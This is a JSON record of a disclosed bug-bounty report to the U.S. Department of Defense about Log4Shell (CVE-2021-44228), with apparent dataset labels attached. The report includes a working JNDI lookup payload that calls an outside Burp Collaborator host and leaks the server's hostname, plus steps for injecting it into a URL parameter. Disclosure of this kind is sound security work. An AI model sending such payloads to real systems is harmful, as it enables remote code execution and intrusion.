{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "mr_x_strange ",
  "title": "Log4Shell: RCE 0-day exploit on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
  "content": "\nHi team,\nlog4 shell is recent 0-day exploit it's Java package vulnerable. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 domain is vulnerable\nImpact\nRCE\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-44228\nSteps to Reproduce\nGo to this url => https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d\npaste the poc code on \u2588\u2588\u2588\u2588\u2588\u2588 url parameter\nlike this => https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\nthen burp collaborator received reverse ping back\nI attached poc videos and photos below\nPOC CODE\n${jndi:ldap://x${hostName}.log4j.xxxxxxx.burpcollaborator.net/a}\nSuggested Mitigation/Remediation Actions\nhttps://www.lunasec.io/docs/blog/log4j-zero-day/\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1641262980,
  "report_url": "https://hackerone.com/reports/1429014",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Go to the vulnerable URL and append the provided POC code to the specified parameter."
    ],
    [
      2,
      "Monitor the Burp Collaborator for a reverse ping back, confirming the vulnerability."
    ]
  ],
  "vuln_description": "This vulnerability, known as Log4Shell, is a Remote Code Execution (RCE) exploit in the Log4j Java logging library. It allows attackers to execute arbitrary code by exploiting the JNDI (Java Naming and Directory Interface) lookup feature in Log4j when it processes specially crafted log messages.",
  "reason": "The attack involves a straightforward injection of a malicious string into a URL parameter, which triggers the vulnerability. The complexity is low because the exploit does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and the steps to reproduce are simple and well-documented.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The Log4Shell vulnerability involves a Remote Code Execution (RCE) exploit through a Java package (log4j), which is not directly related to authentication or authorization bypass within a single application's user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by swapping user sessions and resource IDs within the same application context, which does not apply to an RCE vulnerability like Log4Shell.",
    "is_detectable": false
  }
}